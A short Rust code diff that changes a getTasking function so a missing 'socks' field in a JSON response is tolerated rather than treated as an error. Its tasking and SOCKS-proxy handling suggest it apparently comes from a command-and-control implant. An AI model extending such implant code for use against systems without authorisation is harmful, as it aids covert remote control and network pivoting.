@@ -24,10 +24,10 @@ pub fn getTasking() -> Result<(), Box<dyn std::error::Error>> {
     for task in tasks.as_array().ok_or("Tasks not array")? {
         handleTask(task)?;
     }
-    let socks = json.get("socks").ok_or("No socks field")?;
-    for sock in socks.as_array().ok_or("Socks not array")? {
-        socks::handle_socks(sock)?;
-        // json server_id contains id , data is raw data, exit bool if exit, port is port? useless?
+    if let Some(socks) = json.get("socks") {
+        for sock in socks.as_array().ok_or("Socks not array")? {
+            socks::handle_socks(sock)?;
+        }
     }
     Ok(())
 }
